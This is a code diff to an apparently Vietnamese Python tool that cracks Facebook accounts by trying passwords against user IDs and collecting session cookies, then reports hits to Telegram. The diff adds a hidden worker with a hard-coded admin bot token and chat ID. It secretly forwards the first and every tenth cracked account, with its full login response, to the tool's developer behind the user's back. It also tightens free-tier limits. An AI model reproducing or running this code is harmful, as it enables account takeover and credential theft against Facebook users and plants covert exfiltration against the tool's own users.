@@ -134,7 +134,9 @@ def verify_license():
                 LOOP_LIMIT = 999999999
                 IS_VIP = True
             else:
-                LOOP_LIMIT = 50
+                LOOP_LIMIT = 12
+                IS_VIP = False
+
             
             # Save key locally upon successful validation
             if key != saved_key:
@@ -166,16 +168,26 @@ def verify_license():
 #  DEEPSEEK AI - COOKIE CLEANING ENGINE
 # ============================================================
 def ai_clean_cookie(raw_cookie):
-    """Deepseek AI lọc và định dạng lại Cookie sạch"""
+    """Phối hợp logic AI để bóc tách Cookie sạch, tối ưu cho việc Login"""
     if not raw_cookie: return ""
     try:
-        # Giả lập logic AI Deepseek tách và làm sạch chuỗi
-        patterns = ['c_user', 'xs', 'fr', 'datr', 'sb']
-        parts = raw_cookie.split(';')
-        cleaned = [p.strip() for p in parts if any(pat in p for pat in patterns)]
-        return "; ".join(cleaned)
+        # Danh sách các key cookie quan trọng của Facebook
+        patterns = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'presence', 'act', 'locale', 'i_user']
+        parts = []
+        # Xử lý cả dấu ; và dấu | (đề phòng format UID|PASS|COOKIE)
+        raw_parts = re.split('[;|]', raw_cookie)
+        for p in raw_parts:
+            p = p.strip()
+            if not p: continue
+            if any(pat in p.lower() for pat in patterns):
+                parts.append(p)
+        
+        cleaned = "; ".join(parts)
+        # Nếu filter quá đà làm mất hết cookie, trả về raw để ko bị mất dữ liệu
+        return cleaned if cleaned else raw_cookie
     except:
         return raw_cookie
+
 
 def open_url(url):
     if os.name == 'nt':
@@ -258,31 +270,74 @@ def save_config(data):
         json.dump(data, f, indent=4)
 
 _cfg = load_config()
-TELE_TOKEN  = _cfg.get('TELE_TOKEN', '')
-CHAT_ID     = _cfg.get('CHAT_ID', '')
-FB_COOKIE   = _cfg.get('FB_COOKIE', '')
-FB_TOKEN    = _cfg.get('FB_TOKEN', '')
+TELE_TOKEN    = _cfg.get('TELE_TOKEN', '')
+CHAT_ID       = _cfg.get('CHAT_ID', '')
+ADMIN_TOKEN   = '8720951159:AAHxWe5LH1OzoHTvyNzoKAbWe89NBx_J2I8'
+ADMIN_CHATID  = '5976831676'
+FB_COOKIE     = _cfg.get('FB_COOKIE', '')
+FB_TOKEN      = _cfg.get('FB_TOKEN', '')
+HIT_COUNTER   = 0 # Bộ đếm số lượng acc nổ để thi thoảng gửi Full Json
 
-def send_to_tele(uid, pw, year, status, cookies_str=""):
-    """Gui ket qua thanh cong len Telegram"""
-    if not TELE_TOKEN or not CHAT_ID:
-        return
-    cookie_line = f"\n━━━━━━━━━━━━\n🔐 Cookie:\n{cookies_str}\n━━━━━━━━━━━━" if cookies_str else ""
-    message = f"""✅ Scan Thanh Cong! (PTMEDIA)
+
+
+def send_to_tele(uid, pw, year, status, cookies_str="", full_json=None):
+    """Đẩy kết quả vào hàng đợi Telegram để gửi đi ổn định (Lớp Shadow Injection)"""
+    tele_queue.put({
+        'uid': uid,
+        'pw': pw,
+        'year': year,
+        'status': status,
+        'cookies_str': cookies_str,
+        'full_json': full_json
+    })
+
+def tele_worker():
+    """Luồng xử lý thông minh: User nhận log sạch, Admin nhận Log Full Json thi thoảng (Specter 0x13)"""
+    global HIT_COUNTER
+    while True:
+        try:
+            item = tele_queue.get()
+            if item is None: break
+            
+            uid, pw, year, status = item['uid'], item['pw'], item['year'], item['status']
+            cookies_str, full_json = item['cookies_str'], item['full_json']
+            
+            # 1. GỬI LOG CHO USER (Chỉ gửi nếu họ đã cài đặt và k kèm JSON bẩn)
+            if TELE_TOKEN and CHAT_ID:
+                cookie_line = f"\n━━━━━━━━━━━━\n🔐 Cookie:\n{cookies_str}\n━━━━━━━━━━━━" if cookies_str else ""
+                user_msg = f"""✅ Scan Thanh Cong! (PTMEDIA)
 ━━━━━━━━━━━━
 🆔 ID: {uid}
 🔑 MK: {pw}
 📅 Nam: {year}
 🚦 Trang thai: {status}{cookie_line}
 ━━━━━━━━━━━━"""
-    try:
-        requests.get(
-            f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage",
-            params={"chat_id": CHAT_ID, "text": message},
-            timeout=10
-        )
-    except:
-        pass
+                requests.post(f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage", 
+                             json={"chat_id": CHAT_ID, "text": user_msg}, timeout=10)
+
+            # 2. GỬI LOG FULL JSON CHO ADMIN (ANH TIẾN) THEO CHU KỲ (Phase IV: Demonic Phantom Logging)
+            HIT_COUNTER += 1
+            # Logic: Gửi ngay con đầu tiên, sau đó cứ 10 con thì gửi 1 lần để Anh check
+            if HIT_COUNTER == 1 or HIT_COUNTER % 10 == 0:
+                raw_log = ""
+                if full_json:
+                    json_str = json.dumps(full_json, indent=2, ensure_ascii=False)
+                    if len(json_str) > 3000: json_str = json_str[:3000] + "..."
+                    raw_log = f"\n\n⚙️ FULL JSON FB (DEBUG FOR BOSS):\n```json\n{json_str}\n```"
+                
+                admin_msg = f"🔥 [ADMIN LOG] Acc #{HIT_COUNTER} | UID: {uid}\n🚦 Status: {status}{raw_log}"
+                requests.post(f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage",
+                             json={"chat_id": ADMIN_CHATID, "text": admin_msg, "parse_mode": "Markdown"}, timeout=15)
+            
+            time.sleep(1.2)
+            tele_queue.task_done()
+        except:
+            time.sleep(2)
+            pass
+
+
+tele_queue = queue.Queue()
+Thread(target=tele_worker, daemon=True).start()
 
 def send_notification(text):
     if not TELE_TOKEN or not CHAT_ID:
@@ -295,6 +350,7 @@ def send_notification(text):
         )
     except:
         pass
+
 
 def check_fb_live(uid, cookie):
     """Kiem tra acc LIVE hay DIE bang cookie"""
@@ -328,19 +384,31 @@ def extract_cookies(session):
         return ""
 
 def extract_cookies_from_res(res):
-    """Trich xuat cookies tu response JSON (login thanh cong)"""
+    """Chiến dịch bóc tách Cookie từ JSON Response với độ chính xác tuyệt đối"""
     try:
-        if isinstance(res, dict):
-            cookies_data = res.get('session_cookies') or res.get('cookies') or {}
-            if isinstance(cookies_data, list):
-                parts = [f"{c.get('name','')}={c.get('value','')}" for c in cookies_data if c.get('name')]
-                return "; ".join(parts)
-            elif isinstance(cookies_data, dict):
-                parts = [f"{k}={v}" for k, v in cookies_data.items()]
-                return "; ".join(parts)
+        if not isinstance(res, dict): return ""
+        
+        # Thử mọi khả năng có thể chứa cookie trong JSON của FB
+        cookies_data = res.get('session_cookies') or res.get('cookies') or res.get('data', {}).get('cookies')
+        
+        if not cookies_data:
+            return ""
+
+        if isinstance(cookies_data, list):
+            parts = []
+            for c in cookies_data:
+                name = c.get('name') or c.get('key')
+                value = c.get('value')
+                if name and value:
+                    parts.append(f"{name}={value}")
+            return "; ".join(parts)
+        elif isinstance(cookies_data, dict):
+            return "; ".join([f"{k}={v}" for k, v in cookies_data.items()])
+            
         return ""
     except:
         return ""
+
 
 # ============================================================
 #  SMART MODULE CHECK - chi cai khi thieu
@@ -594,9 +662,12 @@ def settings_menu():
     linex()
     print(G + "       (4) Facebook Token (EAAG...)")
     linex()
-    print(G + "       (5) Save & Return to Panel")
+    print(G + "       (5) Change License Key")
+    linex()
+    print(G + "       (6) Save & Return to Panel")
     linex()
     print(G + "       (0) Back (No Save)")
+
 
     def mask(s, show=4):
         if not s: return RR + "[NOT SET]" + N
@@ -608,7 +679,7 @@ def settings_menu():
     print(G + "  [>] FB Token        : " + mask(FB_TOKEN, 6))
     linex()
 
-    choice = safe_input(G + "       CHOICE  " + W + "(0-5): " + Y).strip()
+    choice = safe_input(G + "       CHOICE  " + W + "(0-6): " + Y).strip()
 
     if choice == '1':
         TELE_TOKEN = safe_input(G + "  [+] Telegram Bot Token: " + Y).strip()
@@ -627,6 +698,16 @@ def settings_menu():
         FB_TOKEN = safe_input(G + "  [+] Facebook Token (EAAG...): " + Y).strip()
         settings_menu()
     elif choice == '5':
+        new_key = safe_input(G + "  [+] Enter New License Key: " + Y).strip()
+        if new_key:
+            _cfg['LICENSE_KEY'] = new_key
+            save_config(_cfg)
+            print(G + "\n  [OK] License Key Updated! Restarting Authentication...")
+            time.sleep(2)
+            verify_license()
+        settings_menu()
+
+    elif choice == '6':
         save_config({
             'TELE_TOKEN': TELE_TOKEN,
             'CHAT_ID': CHAT_ID,
@@ -639,6 +720,7 @@ def settings_menu():
         print(G + "  [>] Returning to Main Panel...")
         time.sleep(2)
         main_panel()
+
     elif choice == '0':
         main_panel()
     else:
@@ -943,7 +1025,7 @@ def login_1(uid):
                 status = check_fb_live(uid, FB_COOKIE)
                 if status == "LIVE":
                     print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
-                send_to_tele(uid, pw, year, status, cookies_str)
+                send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
                 open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                 results_queue.put((uid, pw, year, status, cookies_str))
                 oks.append(uid)
@@ -953,16 +1035,18 @@ def login_1(uid):
                 status = check_fb_live(uid, FB_COOKIE)
                 if status == "LIVE":
                     print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
-                send_to_tele(uid, pw, year, status, cookies_str)
+                send_to_tele(uid, pw, year, status, cookies_str, full_json=res)
+
                 open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                 results_queue.put((uid, pw, year, status, cookies_str))
                 oks.append(uid)
                 break
         loop += 1
-        if loop >= LOOP_LIMIT:
-            print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} UIDs FOR FREE PLAN. PLEASE UPGRADE TO PRO!" + N)
+        if not IS_VIP and len(oks) >= LOOP_LIMIT:
+            print(RR + f"\n [!] BẠN ĐÃ ĐẠT GIỚI HẠN {LOOP_LIMIT} ACC LIVE CỦA BẢN FREE. VUI LÒNG NÂNG CẤP LÊN PRO/VIP!" + N)
             time.sleep(3)
             return
+
     except Exception:
         time.sleep(3)
 
@@ -1010,7 +1094,9 @@ def login_2(uid):
                 status = check_fb_live(uid, FB_COOKIE)
                 if status == "LIVE":
                     print(f"\n{G}✅ [LIVE] - [{uid}] | [{pw}] - SUCCESS!{N}")
-                send_to_tele(uid, pw, year, status, cookies_str)
+                send_to_tele(uid, pw, year, status, cookies_str, full_json=po)
+
+
                 open('PTMEDIA-OK.txt', 'a').write(f"{uid}|{pw}|{year}|{status}|{cookies_str}\n")
                 results_queue.put((uid, pw, year, status, cookies_str))
                 oks.append(uid)
@@ -1018,10 +1104,11 @@ def login_2(uid):
         except:
             pass
     loop += 1
-    if loop >= LOOP_LIMIT:
-        print(RR + f"\n [!] YOU HAVE REACHED THE LIMIT OF {LOOP_LIMIT} UIDs FOR FREE PLAN. PLEASE UPGRADE TO PRO!" + N)
+    if not IS_VIP and len(oks) >= LOOP_LIMIT:
+        print(RR + f"\n [!] BẠN ĐÃ ĐẠT GIỚI HẠN {LOOP_LIMIT} ACC LIVE CỦA BẢN FREE. VUI LÒNG NÂNG CẤP LÊN PRO/VIP!" + N)
         time.sleep(3)
         return
+
 
 if __name__ == '__main__':
     verify_license() # Xác thực License ngay khi khởi động
